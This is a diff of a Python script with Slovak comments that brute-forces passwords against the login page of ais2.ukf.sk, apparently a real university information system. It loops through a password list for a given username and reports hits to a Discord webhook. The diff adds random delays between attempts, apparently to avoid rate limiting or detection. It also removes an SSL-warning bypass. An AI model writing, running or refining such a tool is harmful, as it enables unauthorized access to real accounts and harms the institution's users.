@@ -1,8 +1,7 @@
 import requests
-from urllib3.exceptions import InsecureRequestWarning
-
-# Ignorovanie SSL warningov
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning) 
+import sys
+import time
+import random
 
 username = input("[*] Zadaj username: ")
 
@@ -24,7 +23,7 @@ def notify_discord(message):
     try:
         requests.post(discord_webhook, json={"content": message})
     except Exception as e:
-        print(f"[-] Error: Chyba pri odosielani na Discord: {e}")
+        print(f"Chyba pri odosielani na Discord: {e}")
 
 def try_login(user, password):
     data = {
@@ -38,7 +37,7 @@ def try_login(user, password):
         "Origin": "https://ais2.ukf.sk",
         "Referer": "https://ais2.ukf.sk/ais/start.do"
     }
-    resp = requests.post(url, data=data, headers=headers, cookies=cookies, allow_redirects=False, verify=False, timeout=10)
+    resp = requests.post(url, data=data, headers=headers, cookies=cookies, allow_redirects=False, timeout=10)
     return resp
 
 for pw in payloads:
@@ -57,4 +56,5 @@ for pw in payloads:
         break
     else:
         print(f"[FAIL] {pw} | status: {resp.status_code}")
-
+        
+    time.sleep(random.uniform(0.8, 1.5))  # Pauza medzi 0.8 a 1.5 sekundy
